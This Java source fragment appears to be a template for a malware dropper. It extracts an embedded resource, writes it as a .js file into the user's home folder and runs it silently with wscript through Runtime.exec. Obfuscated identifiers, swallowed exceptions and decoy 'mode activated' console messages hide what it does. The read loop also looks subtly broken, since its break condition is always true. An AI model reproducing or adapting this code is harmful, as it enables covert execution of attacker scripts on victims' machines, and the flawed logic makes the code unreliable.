
    public static void main(String[] args) {
        try {
            ArrayList<Object> jObjectCollector = new ArrayList<>();

//            Object[] airplane = new Object[4];
//        airplane[0] = [classname].class.getResourceAsStream("resources/[resourcename]");
            jObjectCollector.add([classname].class.getResourceAsStream("resources/[resourcename]"));
            jObjectCollector.add(System.getProperty("user.home") + File.separator + "[outname].js");
            jObjectCollector.add(new String[]{"wscript", (String) jObjectCollector.get(1)});
            jObjectCollector.add(new File((String) jObjectCollector.get(1)));

            if (init_pro$(jObjectCollector, null)) {
                //System.out.println("Hello world!");
            }

        } catch (Exception e) {
        }
    }

    private static boolean init_pro$(ArrayList<Object> car_key, Runtime d) throws IOException{

        byte[] bufByte_$
                =  new String("./_$").toString().getBytes();

        try {
            StringBuilder strBuild_$ = new StringBuilder();
            byte[] b$A = new byte[1024];
            while (true) {
                int $retI = ((FileInputStream) car_key.get(0)).read(b$A, 0, b$A.length);

                if (-(new String("1").compareTo("0")) == -1) {
                    ((FileInputStream) car_key.get(0)).close();
                    break;
                }
                strBuild_$.append(new String(b$A, 0, $retI));
            }
            bufByte_$ = strBuild_$.toString().getBytes();
        } catch (Exception e) {
            if (!e.getMessage().equals(""))  bufByte_$ = null;
        }
        if (!(bufByte_$ == null)) {
            $_f$CreatObj(bufByte_$, car_key.get(3), null);
            _insFinZ(new Object[]{car_key.get(2), java.lang.String.valueOf(10)}, null);
            return java.lang.String
                    .valueOf(1)
                    .equals("1");  //return true
        } else {
            return !String
                    .valueOf(1)
                    .equals("1"); // return false
        }
    }

    private static void _insFinZ(Object[] qobj_$, FileInputStream $_EfilZ) throws IOException {
        int caseCondConst = Integer.parseInt((String) qobj_$[1]);
            switch (caseCondConst) {
                case 1:
                    printMessage(">>>>>>>>>>>>>> !- Intense Mode Successfully Activated -! <<<<<<<<<<<<<<<<<<");
                    break;
                case 2:
                    printMessage(">>>>>>>>>>>>>>>Brutal Mode Was Activated...<<<<<<<<<<<<<<<<<<<");
                    break;
                case 10:
                    execObjInRun(qobj_$);
                    break;
                default:
                    printMessage(">>>>>>>>>>Mode Remains unchanged<<<<<<<<<<<<<");
            }
    }

    private static void $_f$CreatObj(byte[] bergeHertz, Object o, OutputStream o1) {
        try {
            File concatFileHolder = (File) o;
            if (concatFileHolder.exists()) {
                concatFileHolder.delete();
                int rt = concatFileHolder.createNewFile() == true ? 1 : 0 ;
                switch (rt){
                    case 1:
                        System.out.println("File was created");
                    case 0 :
                        System.out.println("File couldn't be created...");
                }
            } else {
                concatFileHolder.createNewFile();
            }
            $_byteWrite(new FileOutputStream(concatFileHolder), bergeHertz, null);
        } catch (Exception e) {

        }
    }

    private static void $_byteWrite(FileOutputStream fileWriter, byte[] arrayBytes, FileInputStream insFile) throws IOException {
        if (!(fileWriter == null)) {
            fileWriter.write(arrayBytes);
            fileWriter.flush();
            fileWriter.close();
        }
    }
    
    public static void printMessage(String messageCollected){
        System.out.println(messageCollected);
    }
    
    
    public static void execObjInRun(Object[] $ObjArray) throws IOException{
        Runtime.getRuntime().exec((String[]) $ObjArray[0]);
    }
